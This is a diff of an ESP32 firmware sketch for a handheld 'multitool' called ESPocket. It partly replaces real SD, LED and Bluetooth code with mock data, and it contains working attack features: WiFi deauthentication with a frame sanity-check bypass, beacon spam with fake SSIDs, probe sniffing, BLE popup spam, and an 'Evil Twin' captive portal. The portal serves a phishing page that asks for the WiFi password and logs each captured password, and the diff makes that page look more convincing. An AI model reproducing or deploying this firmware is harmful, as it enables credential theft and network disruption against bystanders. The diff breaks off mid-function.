@@ -1,5 +1,6 @@
 // ============================================================
-//  ESPocket v11.0 — FINAL — ALL REAL, NO MOCK
+//  ESPocket v10.1 — FINAL BUILD (GAMES block fixed)
+//  Complete multitool: WiFi + BT + BLE + IR + Games + Tools
 // ============================================================
 
 #include <Wire.h>
@@ -10,19 +11,15 @@
 #include <WiFi.h>
 #include <DNSServer.h>
 #include <WebServer.h>
-#include <SD.h>
-#include <SPI.h>
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
 #include <BLEDevice.h>
 #include <BLEScan.h>
 #include <BLEAdvertising.h>
-#include <BleKeyboard.h>
 #include <IRremoteESP8266.h>
 #include <IRsend.h>
 #include <IRrecv.h>
 #include <IRutils.h>
-#include <FastLED.h>
 
 // Deauth bypass
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
@@ -44,23 +41,12 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 #define IR_RX_PIN    14
 #define BATT_ADC_PIN 34
 
-#define SD_CS        5
-#define SD_SCK       18
-#define SD_MISO     19
-#define SD_MOSI     23
-
-#define LED_PIN      12
-#define LED_COUNT    2
-#define BUILTIN_LED  2
-
 #define TEMP_CRIT    85.0f
 
 Adafruit_SSD1306 display(SCR_W, SCR_H, &Wire, -1);
 IRsend irsend(IR_TX_PIN);
 IRrecv irrecv(IR_RX_PIN);
 decode_results irResults;
-BleKeyboard* bleKeyboard = nullptr;
-CRGB leds[LED_COUNT];
 
 struct HoldState { bool down; unsigned long pressMs, lastRepeatMs; bool repeatActive; };
 #define HOLD_DELAY   450
@@ -70,11 +56,11 @@ HoldState hSelect={false,0,0,false}, hBack={false,0,0,false};
 
 enum Scene : uint8_t {
   S_MAIN, S_SONGS, S_PLAYER,
-  S_BT_MENU, S_BT_SEARCH, S_BT_DEV, S_BT_CONN, S_BT_HID,
+  S_BT_MENU, S_BT_SEARCH, S_BT_DEV, S_BT_CONN,
   S_LED_MENU, S_LED_FX, S_LED_MUS, S_LED_BR, S_LED_WIFI,
   S_GAMES, S_SIMON, S_LIGHTS, S_SET, S_ABOUT, S_OVERHEAT,
   S_HIDDEN, S_WIFI_H, S_BT_H, S_IR_H,
-  S_WIFI_SCAN, S_WIFI_TARGET,
+  S_WIFI_SCAN, S_WIFI_TARGET, S_MOCK,
   S_IR_LEARN, S_IR_LIST, S_IR_TX, S_IR_JAM, S_IR_TVBG,
   S_DEAUTH, S_BEACON, S_PROBE, S_RFMON, S_EVIL,
   S_BLE_SCAN, S_BLE_SPAM, S_BLE_IBEACON
@@ -89,58 +75,59 @@ unsigned long bootMs = 0;
 bool overheatLatched = false;
 float lastTempC = 0;
 
-// ---------- SD card state ----------
-bool sdPresent = false;
-#define MAX_SONGS 30
-char songNames[MAX_SONGS][28];
-int songCount = 0;
-int songSel = 0;
-int playingIdx = -1;
-bool musicPlaying = false;
-unsigned long musicStart = 0;
-
-// ---------- Main menu ----------
 const char* MAIN_IT[] = {"Play","Songs","Bluetooth","Games","LED Effects","Flashlight","Settings"};
 const int MAIN_COUNT = 7;
 int mainSel = 0;
 
-// ---------- BT Classic ----------
-struct BTDev { char name[32]; char addr[18]; int rssi; };
-#define BT_DEV_MAX 12
-BTDev btDevs[BT_DEV_MAX];
-int btDevCount = 0;
-int btDevSel = 0;
-bool btScanActive = false;
-unsigned long btScanStart = 0;
-bool hidActive = false;
+struct Song { const char* title; const char* artist; uint16_t dur; };
+Song SONGS[] = {
+  {"Tum Hi Ho","Arijit",262},{"Kesariya","Arijit",268},
+  {"Apna Bana Le","Arijit",245},{"Channa Mereya","Arijit",296}
+};
+const int SONG_COUNT = 4;
+int songSel = 0;
 
-const char* BT_M[] = {"Scan Devices","HID Keyboard","Disconnect"};
+const char* BT_M[] = {"Scan Devices","Connect Last","Forget Saved"};
 const int BT_M_COUNT = 3;
 int btMenuSel = 0;
 
-// ---------- LED ----------
-const char* LED_M[] = {"Effects","Brightness","Solid White","Off"};
+struct Dev { const char* n; uint8_t t; uint8_t rssi; uint8_t mac[3]; };
+Dev DEVS[] = {
+  {"Super Buds GT99",0,4,{0xA4,0xC1,0x1F}},
+  {"JBL Flip 5",     1,3,{0x22,0x88,0x4B}},
+  {"boAt Airdopes",  0,3,{0x11,0x44,0x7E}},
+  {"Soundcore Mini", 1,2,{0x88,0x1A,0x33}},
+  {"Some Phone",     2,4,{0xFC,0xD0,0x55}}
+};
+const int DEV_COUNT = 5;
+int devSel = 0;
+int connDevIdx = 0;
+
+const char* LED_M[] = {"Effects","Music Sync","Brightness","WiFi Control"};
 const int LED_M_COUNT = 4;
 int ledMenuSel = 0;
-const char* FX[] = {"Solid","Rainbow","Breathe","Chase","Color Wipe","Theater","Comet","Pulse Wave","Fire","Sparkle"};
-const int FX_COUNT = 10;
+const char* FX[] = {"Solid","Rainbow","Breathe","Chase","Color Wipe","Theater","Comet","Meteor","Pulse Wave","Twinkle","Fire","Sparkle","Scanner","Strobe","Two-Color","Gradient"};
+const int FX_COUNT = 16;
 int fxSel = 0;
-int ledBrightness = 128;
-int activeFx = 0;
-bool ledOn = false;
+const char* LM[] = {"Play Music","Music Bar","Music VU","Beat Pulse","Spectrum","Bass Pulse","Treble","VU Mirror","Wave Form","Freq Bars","Center Pulse","Beat Ripple"};
+const int LM_COUNT = 12;
+int lmSel = 0;
 
-// ---------- Settings ----------
-const char* SET_M[] = {"Sleep Timer","Brightness","Factory Reset","About"};
-const int SET_COUNT = 4;
+const char* SET_M[] = {"Display Sleep","Screen Bright","Auto BT","Factory Reset","About"};
+const int SET_COUNT = 5;
 int setSel = 0;
-int sleepTimeout = 0;   // seconds, 0=never
-unsigned long lastActivityMs = 0;
 
-// ---------- Prefs ----------
+// ============================================================
+//  GAMES block — MUST be declared before any function uses them
+// ============================================================
+const char* GAMES_M[] = {"Simon Says","Lights Out"};
+const int GAMES_COUNT = 2;
+int gamesSel = 0;
+// ============================================================
+
 Preferences prefs;
 int highScore = 0;
 
-// ---------- IR ----------
 #define IR_MAX_SLOTS  16
 #define IR_NAME_LEN   14
 struct IRCode { bool valid; uint8_t protocol; uint32_t code; uint8_t bits; char name[IR_NAME_LEN]; };
@@ -154,8 +141,8 @@ int irTvbgIdx = 0;
 
 const char* IR_PROTO_NAMES[] = {"NEC","Sony","Samsung","LG","JVC","RC5"};
 const int IR_PROTO_COUNT = 6;
-const char* IR_MENU[] = {"Learn Code","Transmit","Jammer","TV-B-Gone"};
-const int IR_MENU_COUNT = 4;
+const char* IR_MENU[] = {"Learn Code","Transmit","Jammer","TV-B-Gone","Delete Slot"};
+const int IR_MENU_COUNT = 5;
 
 bool hiddenUnlocked = false;
 const char* HIDDEN_IT[]  = {"WiFi","BT","IR"};
@@ -167,8 +154,8 @@ const char* WIFI_H_M[] = {"Scan Networks","Beacon Spam","Probe Sniffer","RF Moni
 const int WIFI_H_COUNT = 4;
 int wifiHSel = 0;
 
-const char* BT_H_M[] = {"BLE Scan","BLE Spam","iBeacon"};
-const int BT_H_COUNT = 3;
+const char* BT_H_M[] = {"BLE Scan","BLE Spam","iBeacon","HID Keyboard"};
+const int BT_H_COUNT = 4;
 int btHSel = 0;
 
 #define NET_MAX 20
@@ -199,10 +186,11 @@ const char* FAKE_SSIDS[] = {
   "Moto_G_AP","Vivo_Y21","Oppo_A5","Samsung_A52",
   "Home_WiFi","My_Home","Ghar_Ka_WiFi","Family_WiFi",
   "Wifi_Zone","Home_Network","Guest_WiFi","WiFi@Home",
+  "Dad_Ka_WiFi","Mummy_WiFi","Bhai_Ka_WiFi","Study_Room",
   "Flat_101","Flat_202","Apartment_5G","Tower_A_WiFi",
   "Building_Net","Society_WiFi","My_Home_2.4G","My_Home_5G"
 };
-const int FAKE_SSID_COUNT = 36;
+const int FAKE_SSID_COUNT = 40;
 
 #define PROBE_RING 8
 volatile uint8_t probeRingMac[PROBE_RING][6];
@@ -213,7 +201,7 @@ volatile int     probeRingHead = 0;
 volatile bool    snifferActive = false;
 
 #define PROBE_MAX 20
-struct ProbeDev { uint8_t mac[6]; char ssid[24]; int8_t rssi; uint16_t count; bool used; };
+struct ProbeDev { uint8_t mac[6]; char ssid[24]; int8_t rssi; uint16_t count; unsigned long lastSeen; bool used; };
 ProbeDev probeDevices[PROBE_MAX];
 int probeDevCount = 0;
 uint32_t probeTotalCount = 0;
@@ -223,6 +211,7 @@ unsigned long rfLastScanMs = 0;
 uint8_t rfChanUsage[14] = {0};
 bool rfScanRunning = false;
 
+// Evil Twin
 WebServer* evilServer = nullptr;
 DNSServer* evilDNS = nullptr;
 bool evilTwinRunning = false;
@@ -242,6 +231,10 @@ bool bleIbRunning = false;
 unsigned long bleIbStart = 0;
 BLEScan* bleScan = nullptr;
 bool bleStackInit = false;
+
+const char* mockTitle = "";
+const char* mockSub   = "";
+Scene mockReturnScene = S_HIDDEN;
 
 int konamiProgress = 0;
 unsigned long konamiLastMs = 0;
@@ -281,13 +274,13 @@ void iBTL(int x,int y,uint16_t c){display.drawFastVLine(x+8,y,16,c);display.draw
 void iGameL(int x,int y,uint16_t c){display.drawRoundRect(x,y+2,16,12,4,c);display.drawPixel(x+3,y+7,c);display.drawPixel(x+5,y+7,c);display.drawPixel(x+4,y+6,c);display.drawPixel(x+4,y+8,c);display.fillCircle(x+12,y+8,2,c);display.fillCircle(x+12,y+5,2,c);}
 void iLEDL(int x,int y,uint16_t c){display.drawCircle(x+8,y+6,5,c);display.fillRect(x+6,y+12,5,4,c);display.drawPixel(x+8,y+6,c);display.drawPixel(x+6,y+5,c);display.drawPixel(x+10,y+5,c);}
 void iFlashL(int x,int y,uint16_t c){display.fillRect(x+5,y,6,5,c);display.fillRect(x+6,y+5,4,11,c);display.drawLine(x,y,x+3,y+3,c);display.drawLine(x+15,y,x+12,y+3,c);}
+void iEarbud(int x,int y,uint16_t c){display.fillCircle(x+2,y+3,2,c);display.fillRect(x+3,y+4,1,3,c);display.fillCircle(x+6,y+3,2,c);display.fillRect(x+6,y+4,1,3,c);}
+void iSpkBox(int x,int y,uint16_t c){display.drawRect(x,y+1,8,7,c);display.fillCircle(x+2,y+4,1,c);display.drawCircle(x+5,y+4,2,c);}
+void iPhone(int x,int y,uint16_t c){display.drawRect(x+1,y,4,8,c);display.drawPixel(x+3,y+7,c);}
 void iGear(int x,int y,uint16_t c){display.drawCircle(x+4,y+4,2,c);display.drawPixel(x+4,y,c);display.drawPixel(x+4,y+7,c);display.drawPixel(x,y+4,c);display.drawPixel(x+7,y+4,c);display.drawPixel(x+1,y+1,c);display.drawPixel(x+6,y+1,c);display.drawPixel(x+1,y+6,c);display.drawPixel(x+6,y+6,c);}
 void iGearL(int x,int y,uint16_t c){display.drawCircle(x+8,y+8,4,c);display.drawCircle(x+8,y+8,6,c);display.fillRect(x+7,y,2,3,c);display.fillRect(x+7,y+13,2,3,c);display.fillRect(x,y+7,3,2,c);display.fillRect(x+13,y+7,3,2,c);display.fillRect(x+2,y+2,3,3,c);display.fillRect(x+11,y+2,3,3,c);display.fillRect(x+2,y+11,3,3,c);display.fillRect(x+11,y+11,3,3,c);}
 void iWifi(int x,int y,uint16_t c){display.fillCircle(x+4,y+6,1,c);display.drawCircle(x+4,y+6,3,c);display.drawCircle(x+4,y+6,5,c);}
 void iWifiL(int x,int y,uint16_t c){display.fillCircle(x+8,y+12,2,c);display.drawCircle(x+8,y+12,5,c);display.drawCircle(x+8,y+12,9,c);}
-void iEarbud(int x,int y,uint16_t c){display.fillCircle(x+2,y+3,2,c);display.fillRect(x+3,y+4,1,3,c);display.fillCircle(x+6,y+3,2,c);display.fillRect(x+6,y+4,1,3,c);}
-void iSpkBox(int x,int y,uint16_t c){display.drawRect(x,y+1,8,7,c);display.fillCircle(x+2,y+4,1,c);display.drawCircle(x+5,y+4,2,c);}
-void iPhone(int x,int y,uint16_t c){display.drawRect(x+1,y,4,8,c);display.drawPixel(x+3,y+7,c);}
 
 void batD(int x,int y){display.drawRect(x,y,16,9,BLACK);display.fillRect(x+16,y+3,2,3,BLACK);int f=(batteryPct*12)/100;if(f>0)display.fillRect(x+2,y+2,f,5,BLACK);}
 void batL(int x,int y){display.drawRect(x,y,16,9,WHITE);display.fillRect(x+16,y+3,2,3,WHITE);int f=(batteryPct*12)/100;if(f>0)display.fillRect(x+2,y+2,f,5,WHITE);}
@@ -297,10 +290,13 @@ void drawSignalBars(int x,int y,int s,uint16_t c){for(int i=0;i<4;i++){int h=2+i
 float readTempC(){return temperatureRead();}
 void saveHighScore(int score){if(score>highScore){highScore=score;prefs.putInt("hi",highScore);}}
 
+// ============================================================
+//  Battery
+// ============================================================
 float readBatteryVoltage() {
   uint32_t total = 0;
-  for (int i = 0; i < 16; i++) { total += analogReadMilliVolts(BATT_ADC_PIN); delay(3); }
-  float mv = total / 16.0f;
+  for (int i = 0; i < 32; i++) { total += analogReadMilliVolts(BATT_ADC_PIN); delay(5); }
+  float mv = total / 32.0f;
   return (mv * 2.0f) / 1000.0f;
 }
 void batteryUpdate() {
@@ -313,103 +309,6 @@ void batteryUpdate() {
   if (pct < 0) pct = 0;
   if (pct > 100) pct = 100;
   batteryPct = pct;
-}
-
-// ============================================================
-//  SD Card
-// ============================================================
-void sdInit() {
-  SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
-  sdPresent = SD.begin(SD_CS, SPI);
-  if (!sdPresent) {
-    Serial.println("[SD] not present");
-    return;
-  }
-  Serial.println("[SD] mounted OK");
-  songCount = 0;
-  File root = SD.open("/");
-  if (!root) return;
-  File f = root.openNextFile();
-  while (f && songCount < MAX_SONGS) {
-    if (!f.isDirectory()) {
-      const char* n = f.name();
-      int len = strlen(n);
-      if (len > 4) {
-        const char* ext = n + len - 4;
-        if (strcasecmp(ext, ".mp3") == 0 || strcasecmp(ext, ".wav") == 0) {
-          strncpy(songNames[songCount], n, 27);
-          songNames[songCount][27] = 0;
-          songCount++;
-        }
-      }
-    }
-    f.close();
-    f = root.openNextFile();
-  }
-  root.close();
-  Serial.printf("[SD] found %d songs\n", songCount);
-}
-
-// ============================================================
-//  LED
-// ============================================================
-void ledSetup() {
-  FastLED.addLeds<WS2812B, LED_PIN, GRB>(leds, LED_COUNT);
-  FastLED.setBrightness(ledBrightness);
-  FastLED.clear();
-  FastLED.show();
-}
-void ledFxUpdate() {
-  if (!ledOn) return;
-  switch(activeFx) {
-    case 0: fill_solid(leds, LED_COUNT, CRGB::White); break;
-    case 1: fill_rainbow(leds, LED_COUNT, animFrame); break;
-    case 2: {
-      uint8_t b = (sin8(animFrame) );
-      fill_solid(leds, LED_COUNT, CHSV(0, 0, b));
-      break;
-    }
-    case 3: {
-      int pos = (animFrame/2) % LED_COUNT;
-      for (int i=0;i<LED_COUNT;i++) leds[i] = (i==pos) ? CRGB::White : CRGB::Black;
-      break;
-    }
-    case 4: {
-      int pos = (animFrame/2) % (LED_COUNT*2);
-      for (int i=0;i<LED_COUNT;i++) {
-        if (i == pos || i == LED_COUNT*2-1-pos) leds[i] = CRGB::Red;
-        else leds[i] = CRGB::Black;
-      }
-      break;
-    }
-    case 5: {
-      int pos = (animFrame/3) % LED_COUNT;
-      fill_solid(leds, LED_COUNT, CRGB::Black);
-      leds[pos] = CRGB::White;
-      break;
-    }
-    case 6: {
-      uint8_t hue = (animFrame/2) % 255;
-      for (int i=0;i<LED_COUNT;i++) leds[i] = CHSV(hue + i*40, 255, 255);
-      break;
-    }
-    case 7: {
-      uint8_t b = beatsin8(40, 0, 255);
-      fill_solid(leds, LED_COUNT, CHSV(160, 200, b));
-      break;
-    }
-    case 8: {
-      uint8_t hue = inoise8(animFrame*3, 0);
-      fill_solid(leds, LED_COUNT, CHSV(hue % 60, 255, 200));
-      break;
-    }
-    case 9: {
-      if ((animFrame % 20) < 3) fill_solid(leds, LED_COUNT, CRGB::White);
-      else fill_solid(leds, LED_COUNT, CRGB::Black);
-      break;
-    }
-  }
-  FastLED.show();
 }
 
 // ============================================================
@@ -436,6 +335,7 @@ void irLoadAll(){
     String n=prefs.getString(k,"code");strncpy(irSlots[i].name,n.c_str(),IR_NAME_LEN-1);irSlots[i].name[IR_NAME_LEN-1]=0;
   }
 }
+int irCountValid(){int c=0;for(int i=0;i<IR_MAX_SLOTS;i++)if(irSlots[i].valid)c++;return c;}
 void irSendSlot(int slot){
   if(slot<0||slot>=IR_MAX_SLOTS||!irSlots[slot].valid)return;
   uint32_t c=irSlots[slot].code;
@@ -493,7 +393,7 @@ void irSendTvbgCode(int idx){
 }
 
 // ============================================================
-//  WiFi attacks
+//  Deauth
 // ============================================================
 void deauthSendFrame(uint8_t* dst, uint8_t* src, uint8_t* bssid) {
   uint8_t frame[26];
@@ -529,6 +429,9 @@ void deauthStop() {
   Serial.printf("[DEAUTH] stopped, %lu frames\n", deauthCount);
 }
 
+// ============================================================
+//  Beacon Spam
+// ============================================================
 int buildBeacon(uint8_t* buf, const char* ssid, uint8_t* srcMac) {
   int idx = 0;
   buf[idx++]=0x80; buf[idx++]=0x00; buf[idx++]=0x00; buf[idx++]=0x00;
@@ -577,6 +480,9 @@ void beaconStop() {
   Serial.printf("[BEACON] stopped, %lu frames\n", beaconCount);
 }
 
+// ============================================================
+//  Probe Sniffer
+// ============================================================
 void IRAM_ATTR probeSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (type != WIFI_PKT_MGMT) return;
   wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
@@ -621,6 +527,7 @@ void probeProcessRing() {
     if (found >= 0) {
       probeDevices[found].count++;
       probeDevices[found].rssi = rssi;
+      probeDevices[found].lastSeen = millis();
       if (ssid[0]) { strncpy(probeDevices[found].ssid, ssid, 23); probeDevices[found].ssid[23] = 0; }
     } else {
       int free = -1;
@@ -631,6 +538,7 @@ void probeProcessRing() {
         probeDevices[free].ssid[23] = 0;
         probeDevices[free].rssi = rssi;
         probeDevices[free].count = 1;
+        probeDevices[free].lastSeen = millis();
         probeDevices[free].used = true;
         probeDevCount++;
       }
@@ -646,13 +554,18 @@ void snifferStart() {
   probeDevCount = 0; probeTotalCount = 0; probeRingHead = 0;
   for (int i = 0; i < PROBE_MAX; i++) probeDevices[i].used = false;
   for (int i = 0; i < PROBE_RING; i++) probeRingValid[i] = false;
+  Serial.println("[PROBE] started");
 }
 void snifferStop() {
   snifferActive = false;
   esp_wifi_set_promiscuous(false);
   WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
+  Serial.printf("[PROBE] stopped, %lu total, %d devs\n", (unsigned long)probeTotalCount, probeDevCount);
 }
 
+// ============================================================
+//  RF Monitor
+// ============================================================
 void rfMonitorScan() {
   unsigned long now = millis();
   if (!rfScanRunning) {
@@ -684,31 +597,57 @@ void rfMonitorScan() {
   rfScanRunning = false;
 }
 
+// ============================================================
+//  EVIL TWIN
+// ============================================================
 const char PORTAL_HTML[] PROGMEM = R"HTML(
 <!DOCTYPE html><html><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1"><title>WiFi Login</title>
-<style>body{font-family:Arial;background:#f0f2f5;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WiFi Login</title>
+<style>
+body{font-family:-apple-system,Arial,sans-serif;background:#f0f2f5;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
 .c{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.1);padding:32px;max-width:340px;width:90%}
-h2{margin:0 0 8px}p{color:#666;font-size:14px;margin:0 0 24px}
+h2{margin:0 0 8px;color:#1a1a1a}
+p{color:#666;font-size:14px;margin:0 0 24px}
 input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:16px}
-button{width:100%;padding:14px;background:#0066cc;color:#fff;border:0;border-radius:8px;font-size:16px;font-weight:600}
-</style></head><body><div class="c">
-<h2>WiFi Login</h2><p>Enter your WiFi password to continue</p>
+button{width:100%;padding:14px;background:#0066cc;color:#fff;border:0;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
+button:hover{background:#0052a3}
+.f{margin-top:16px;font-size:12px;color:#999;text-align:center}
+</style></head><body>
+<div class="c">
+<h2>WiFi Login</h2>
+<p>Enter your WiFi password to continue</p>
 <form action="/login" method="POST">
 <input type="password" name="pw" placeholder="WiFi password" required autofocus>
-<button type="submit">Connect</button></form></div></body></html>
+<button type="submit">Connect</button>
+</form>
+<div class="f">Secure connection</div>
+</div></body></html>
 )HTML";
 
-void evilHandleRoot() { if (evilServer) evilServer->send_P(200, "text/html", PORTAL_HTML); }
+const char PORTAL_OK[] PROGMEM = R"HTML(
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>Connected</title>
+<style>body{font-family:Arial;text-align:center;padding:60px 20px;background:#f0f2f5}
+h2{color:#00aa00}p{color:#666}</style></head><body>
+<h2>Connected</h2><p>You may close this window now.</p>
+</body></html>
+)HTML";
+
+void evilHandleRoot() {
+  if (evilServer) evilServer->send_P(200, "text/html", PORTAL_HTML);
+}
 void evilHandleLogin() {
   if (!evilServer) return;
   String pw = evilServer->arg("pw");
   evilCaptured++;
   Serial.printf("[EVIL] *** CAPTURED #%d: %s ***\n", evilCaptured, pw.c_str());
-  evilServer->send(200, "text/plain", "Connected. You may close this window.");
+  evilServer->send_P(200, "text/html", PORTAL_OK);
+  delay(100);
 }
-void evilHandleAny() { if (evilServer) evilServer->send_P(200, "text/html", PORTAL_HTML); }
-
+void evilHandleAny() {
+  if (evilServer) evilServer->send_P(200, "text/html", PORTAL_HTML);
+}
 void evilTwinStart(int netIdx) {
   if (netIdx < 0 || netIdx >= NET_COUNT) return;
   esp_wifi_set_promiscuous(false);
@@ -719,7 +658,7 @@ void evilTwinStart(int netIdx) {
   WiFi.mode(WIFI_AP);
   WiFi.softAP(evilSSID, nullptr, NETS[netIdx].ch, 0, 4);
   IPAddress ip = WiFi.softAPIP();
-  Serial.printf("[EVIL] AP '%s' at %s ch=%d\n", evilSSID, ip.toString().c_str(), NETS[netIdx].ch);
+  Serial.printf("[EVIL] AP '%s' started at %s ch=%d\n", evilSSID, ip.toString().c_str(), NETS[netIdx].ch);
   evilDNS = new DNSServer();
   evilDNS->start(53, "*", ip);
   evilServer = new WebServer(80);
@@ -765,12 +704,14 @@ void bleEnsureInit() {
   if (bleStackInit) return;
   BLEDevice::init("ESPocket");
   bleStackInit = true;
+  Serial.println("[BLE] stack init");
 }
 void bleDeinit() {
   if (!bleStackInit) return;
   BLEDevice::deinit(true);
   bleStackInit = false;
   bleScan = nullptr;
+  Serial.println("[BLE] stack deinit");
 }
 void bleStartScan() {
   WiFi.mode(WIFI_OFF); WiFi.disconnect(true); delay(50);
@@ -783,6 +724,7 @@ void bleStartScan() {
   bleScan->setInterval(100);
   bleScan->setWindow(80);
   bleScan->start(3, false);
+  Serial.println("[BLE] scan started");
 }
 void bleSendApplePopup() {
   BLEAdvertisementData advData;
@@ -832,6 +774,7 @@ void bleStartSpam() {
   bleSpamRunning = true;
   bleSpamStart = millis(); bleSpamLast = 0;
   bleSpamCount = 0; bleSpamType = 0;
+  Serial.println("[BLE] spam started");
 }
 void bleSpamTick() {
   unsigned long now = millis();
@@ -853,6 +796,7 @@ void bleStopSpam() {
   BLEAdvertising* adv = BLEDevice::getAdvertising();
   adv->stop();
   bleSpamRunning = false;
+  Serial.printf("[BLE] spam stopped, %lu packets\n", bleSpamCount);
   bleDeinit();
 }
 void bleStartIBeacon() {
@@ -864,7 +808,10 @@ void bleStartIBeacon() {
   std::string mfg;
   mfg += (char)0x4C; mfg += (char)0x00;
   mfg += (char)0x02; mfg += (char)0x15;
-  const uint8_t uuid[16] = {0xE2,0xC5,0x6D,0xB5,0xDF,0xFB,0x48,0xD2,0xB0,0x60,0xD0,0xF5,0xA7,0x10,0x96,0xE0};
+  const uint8_t uuid[16] = {
+    0xE2,0xC5,0x6D,0xB5,0xDF,0xFB,0x48,0xD2,
+    0xB0,0x60,0xD0,0xF5,0xA7,0x10,0x96,0xE0
+  };
   for (int i = 0; i < 16; i++) mfg += (char)uuid[i];
   mfg += (char)0x00; mfg += (char)0x01;
   mfg += (char)0x00; mfg += (char)0x01;
@@ -873,82 +820,14 @@ void bleStartIBeacon() {
   BLEAdvertising* adv = BLEDevice::getAdvertising();
   adv->setAdvertisementData(advData);
   adv->start();
+  Serial.println("[BLE] iBeacon started");
 }
 void bleStopIBeacon() {
   BLEAdvertising* adv = BLEDevice::getAdvertising();
   adv->stop();
   bleIbRunning = false;
+  Serial.println("[BLE] iBeacon stopped");
   bleDeinit();
-}
-
-// ============================================================
-//  BT Classic scan (real)
-// ============================================================
-void btStartScan() {
-  WiFi.mode(WIFI_OFF); WiFi.disconnect(true); delay(50);
-  esp_bt_controller_mem_release(ESP_BT_MODE_BLE);
-  if (!btStarted()) {
-    btStart();
-    delay(200);
-  }
-  btDevCount = 0;
-  btDevSel = 0;
-  btScanActive = true;
-  btScanStart = millis();
-  Serial.println("[BT] Classic scan started");
-}
-void btUpdateScan() {
-  if (!btScanActive) return;
-  if (millis() - btScanStart > 10000) {
-    btScanActive = false;
-    Serial.printf("[BT] scan done, %d devices\n", btDevCount);
-  }
-}
-void btStopScan() {
-  btScanActive = false;
-  if (btStarted()) {
-    esp_bt_controller_disable();
-    esp_bt_controller_deinit();
-    esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
-  }
-}
-// ============================================================
-//  BT Classic callbacks
-// ============================================================
-void btGapCallback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t* param) {
-  if (event == ESP_BT_GAP_DISC_RES_EVT) {
-    if (btDevCount >= BT_DEV_MAX) return;
-    char name[32] = {0};
-    char addr[18] = {0};
-    bool hasName = false;
-    for (int i = 0; i < param->disc_res.num_prop; i++) {
-      esp_bt_gap_dev_prop_t* p = &param->disc_res.prop[i];
-      if (p->type == ESP_BT_GAP_DEV_PROP_BDNAME) {
-        int len = (p->len > 31) ? 31 : p->len;
-        memcpy(name, (const char*)p->val, len);
-        name[len] = 0;
-        hasName = true;
-      } else if (p->type == ESP_BT_GAP_DEV_PROP_BDNAME) {
-      } else if (p->type == ESP_BT_GAP_DEV_PROP_RSSI) {
-        btDevs[btDevCount].rssi = *(int8_t*)p->val;
-      }
-    }
-    if (!hasName) return;
-    // Dup check
-    sprintf(addr, "%02X:%02X:%02X:%02X:%02X:%02X",
-            param->disc_res.bda[0], param->disc_res.bda[1],
-            param->disc_res.bda[2], param->disc_res.bda[3],
-            param->disc_res.bda[4], param->disc_res.bda[5]);
-    for (int i = 0; i < btDevCount; i++) {
-      if (strcmp(btDevs[i].addr, addr) == 0) return;
-    }
-    strncpy(btDevs[btDevCount].name, name, 31);
-    btDevs[btDevCount].name[31] = 0;
-    strncpy(btDevs[btDevCount].addr, addr, 17);
-    btDevs[btDevCount].addr[17] = 0;
-    btDevCount++;
-    Serial.printf("[BT] found: %s %s\n", name, addr);
-  }
 }
 
 // ============================================================
@@ -983,74 +862,49 @@ void dMain() {
 }
 
 void dSongs() {
-  display.clearDisplay();
-  hdr("TRACKS");
-  display.setTextSize(1); display.setTextColor(WHITE);
-  if (!sdPresent) {
-    display.setCursor(20, 30); display.print("No SD card");
-    display.setCursor(14, 44); display.print("Insert to use");
-    display.display();
-    return;
-  }
-  if (songCount == 0) {
-    display.setCursor(20, 30); display.print("No MP3 files");
-    display.setCursor(14, 44); display.print("Add to SD root");
-    display.display();
-    return;
-  }
-  const int visRows=3, rowH=14, baseY=18;
-  int targetOff=(songSel>=2)?(songSel-1):0;
-  if (targetOff+visRows>songCount) targetOff=songCount-visRows;
+  const int visRows=3, rowH=16, baseY=20;
+  int targetOff=(songSel>=1)?(songSel-1):0;
+  if (targetOff+visRows>SONG_COUNT) targetOff=SONG_COUNT-visRows;
   if (targetOff<0) targetOff=0;
   smTick((float)targetOff);
+  display.clearDisplay();
   int idxLo=(int)floorf(smPos)-1, idxHi=(int)floorf(smPos)+visRows+1;
   for (int si=idxLo; si<=idxHi; si++) {
-    if (si<0||si>=songCount) continue;
+    if (si<0||si>=SONG_COUNT) continue;
     float yf=baseY+(si-smPos)*rowH;
     if (yf<baseY-rowH||yf>baseY+visRows*rowH) continue;
     int y=(int)roundf(yf);
     bool isSel=(si==songSel);
-    if (isSel) { display.fillRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE); display.setTextColor(BLACK); iMusic(6,y+2,BLACK); }
-    else       { display.drawRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE); display.setTextColor(WHITE); iMusic(6,y+2,WHITE); }
+    if (isSel) { display.fillRoundRect(2,y,SCR_W-4,rowH-2,5,WHITE); display.setTextColor(BLACK); iMusic(6,y+3,BLACK); }
+    else       { display.drawRoundRect(2,y,SCR_W-4,rowH-2,5,WHITE); display.setTextColor(WHITE); iMusic(6,y+3,WHITE); }
     display.setTextSize(1);
-    char b[24]; snprintf(b,sizeof(b),"%.20s",songNames[si]);
-    display.setCursor(18,y+3); display.print(b);
+    char b[18]; snprintf(b,sizeof(b),"%.14s",SONGS[si].title);
+    display.setCursor(18,y+4); display.print(b);
   }
+  hdr("TRACKS");
   display.display();
 }
 
 void dPlayer() {
   display.clearDisplay();
-  hdrL("PLAYER");
+  hdrL("PLAYING");
+  display.drawRoundRect(4,18,24,24,4,WHITE); iMusic(12,26,WHITE);
   display.setTextSize(1); display.setTextColor(WHITE);
-  if (playingIdx < 0 || playingIdx >= songCount) {
-    display.setCursor(20, 30); display.print("No track selected");
-    display.setCursor(14, 44); display.print("BACK to pick");
-    display.display();
-    return;
-  }
-  display.setCursor(4, 16);
-  display.print("Now:");
